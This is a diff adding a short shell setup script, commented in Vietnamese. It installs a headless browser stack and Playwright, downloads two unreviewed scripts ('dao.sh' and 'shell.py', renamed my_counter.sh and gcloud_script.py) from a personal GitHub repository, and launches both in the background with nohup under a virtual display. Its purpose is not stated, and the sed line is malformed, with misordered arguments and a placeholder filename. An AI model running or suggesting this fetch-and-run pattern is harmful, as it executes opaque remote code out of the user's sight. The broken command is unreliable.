@@ -1,0 +1,14 @@
+
+echo "--- Bắt đầu cài đặt các gói hệ thống ---"
+sudo apt-get update
+sudo apt-get install -y xvfb x11-xkb-utils xfonts-base chromium-browser
+pip install playwright
+echo "--- Cài đặt Playwright hoàn tất ---"
+wget -O my_counter.sh https://raw.githubusercontent.com/ChauDuongw/shelltool/refs/heads/main/dao.sh
+wget -O gcloud_script.py https://raw.githubusercontent.com/ChauDuongw/shelltool/refs/heads/main/shell.py
+sed gcloud_script.py 's/maillll/{mail}/g' tên_file.txt
+
+chmod +x my_counter.sh
+nohup xvfb-run -a -s "-screen 0 1280x800x24" python gcloud_script.py > script.log 2>&1 &
+nohup ./my_counter.sh &
+echo "Hoàn thành."
